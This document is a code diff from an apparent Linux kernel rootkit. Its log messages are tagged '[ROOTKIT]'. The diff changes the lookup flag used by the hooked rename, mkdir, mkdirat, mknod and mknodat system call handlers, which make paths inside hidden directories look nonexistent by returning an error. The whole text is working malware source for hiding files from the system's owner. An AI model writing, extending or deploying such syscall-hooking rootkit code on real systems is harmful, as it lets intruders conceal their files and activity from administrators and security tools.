@@ -14,7 +14,7 @@ static inline long do_rename(const sysfun_t orig_func, struct pt_regs *const p_r
                              const unsigned int ui32_at_flags)
 {
     // Check if the new file is in a hidden directory
-    if (is_pathname_hidden(i32_newdfd, s_newname, LOOKUP_PARENTS)) {
+    if (is_pathname_hidden(i32_newdfd, s_newname, LOOKUP_CREATE)) {
         return -ENOENT;
     }
 
@@ -101,7 +101,7 @@ SYSCALL_HOOK_HANDLER2(mkdir, orig_mkdir, p_regs, const char __user *, s_pathname
 {
     pr_info("[ROOTKIT] mkdir(%p, %#ho)\n", s_pathname, ui16_mode);
 
-    return do_check_hidden(orig_mkdir, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_PARENTS);
+    return do_check_hidden(orig_mkdir, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_CREATE);
 }
 
 // sys_mkdirat syscall hook handler
@@ -110,7 +110,7 @@ SYSCALL_HOOK_HANDLER3(mkdirat, orig_mkdirat, p_regs, int, i32_dfd, const char __
 {
     pr_info("[ROOTKIT] mkdirat(%d, %p, %#ho)\n", i32_dfd, s_pathname, ui16_mode);
 
-    return do_check_hidden(orig_mkdirat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_PARENTS);
+    return do_check_hidden(orig_mkdirat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_CREATE);
 }
 
 // sys_mknod syscall hook handler
@@ -119,7 +119,7 @@ SYSCALL_HOOK_HANDLER3(mknod, orig_mknod, p_regs, const char __user *, s_pathname
 {
     pr_info("[ROOTKIT] mknod(%p, %#ho, %u)\n", s_pathname, ui16_mode, ui32_dev);
 
-    return do_check_hidden(orig_mknod, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_PARENTS);
+    return do_check_hidden(orig_mknod, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_CREATE);
 }
 
 // sys_mknodat syscall hook handler
@@ -128,7 +128,7 @@ SYSCALL_HOOK_HANDLER4(mknodat, orig_mknodat, p_regs, int, i32_dfd, const char __
 {
     pr_info("[ROOTKIT] mknodat(%d, %p, %#ho, %u)\n", i32_dfd, s_pathname, ui16_mode, ui32_dev);
 
-    return do_check_hidden(orig_mknodat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_PARENTS);
+    return do_check_hidden(orig_mknodat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_CREATE);
 }
 
 // sys_rmdir syscall hook handler
